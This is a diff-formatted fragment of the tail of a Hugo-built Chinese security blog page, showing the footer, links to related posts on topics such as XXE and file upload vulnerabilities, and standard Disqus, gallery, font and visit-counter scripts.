+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/23_hubee92165a8b53eb67c1fdb5aae9ff5d7_206639_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/23_hubee92165a8b53eb67c1fdb5aae9ff5d7_206639_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="389px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jan 05, 2026 16:41 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E4%BA%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/logo.dce1f8bfc29060f592c952105592cbed_hue0dbb52efcd0a11f02b2eb44f7c0ebcb_82221_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 云安全渗透测试"
+                        
+                        data-hash="md5-3OH4v8KQYPWSyVIQVZLL7Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">云安全渗透测试</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/jsrpc%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/jsrpc%E5%AD%A6%E4%B9%A0/logo.4998b054f7e9bad9a9ac6ae767245e56_hue928e0f3ea83404650027d36811b284b_98229_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post JSRPC学习"
+                        
+                        data-hash="md5-SZiwVPfputmprGrnZyReVg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JSRPC学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/logo.58e5bcb0bd3d1324eccad2c3f1e6533d_hu8e49b83fbe29f997ffee388649dda5f6_35534_250x150_fill_q75_box_smart1.jpeg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 浏览器调试基础"
+                        
+                        data-hash="md5-WOW8sL09EyTsytLD8eZTPQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">浏览器调试基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/logo.eaf9caf191c430d0e5613ac24de20504_huf982861407ee12bbe0887480c50a8e0a_41112_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 文件上传漏洞"
+                        
+                        data-hash="md5-6vnK8ZHEMNDlYTrCTeIFBA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">文件上传漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/logo.fd9d587fa1464342546a9f891e7dd9ee_hu3b1038aa814f7e05ad1c1e15c1f3804d_33344_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post XML外部实体注入漏洞"
+                        
+                        data-hash="md5-/Z1Yf6FGQ0JUap&#43;JHn3Z7g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XML外部实体注入漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
